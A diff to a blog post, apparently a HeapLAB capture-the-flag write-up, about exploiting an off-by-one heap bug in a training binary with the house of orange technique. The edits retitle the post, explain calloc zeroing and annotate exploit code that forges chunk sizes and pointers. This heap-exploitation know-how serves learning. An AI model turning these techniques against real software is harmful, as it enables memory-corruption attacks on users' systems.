@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "HeapLAB 1 - Poison One Byte"
+title:  "HeapLAB 1 - Off By One"
 date:   2022-12-08 20:02:01 +0300
 categories: jekyll update
 ---
@@ -91,15 +91,17 @@ All chunks are allocated with the same size of `0x58` user data, leading to the 
 
 This is another indication that `house of orange` is the technique we should use here - as it will allow us to set a fake file stream on certain `0x60` chunk on the heap. 
 
-The binary also allows `freeing` a chunk by index. \
-Note there is no double free vulnerability here. 
+The binary also allows `freeing` a chunk by index - however there is no double free vulnerability here. 
 
 It also allows `editing` a chunk. \
 There is a check that the chunk wasn't freed, so there is no UAF bug here. 
 
 Finally, it allows us to read the content of an allocated chunk (doesn't work for `freed` chunks).
 
-A very cool trick to trace the internal functions used by Malloc at glibc, is by executing the binary via: `ltrace -e \*alloc ./one_byte`
+A very cool trick to trace the internal functions used by Malloc at glibc, is by executing the binary via: `ltrace -e \*alloc ./one_byte`. \ 
+We can see allocations are performed via `calloc(1, 0x58)`. \
+It means chunks are initialized to zero, hence mitigated against "reuse attacks". 
+
 
 ### Bug
 
@@ -224,9 +226,11 @@ chunk_C_rr = malloc()
 chunk_E_rr = malloc()
 chunk_F_rr = malloc()
 
+# Like before, prepare chunk_B for fake size of 0x91
 edit(chunk_C_rr, b"C" * chunk_C_padding + p64(fake_prev_size) + p64(fake_size) + fake_fd + fake_bk + fake_next_chunk_prev_size + fake_next_chunk_size)
 edit(chunk_A_rr, b"A" * 0x50 + p64(0x60) + p64(new_chunk_B_size))
 
+# Get a fresh 0x90 chunk within the unsortedbin
 free(chunk_B_rr)
 
 # remaindering, move the 0x30 chunk to the unsortedbin
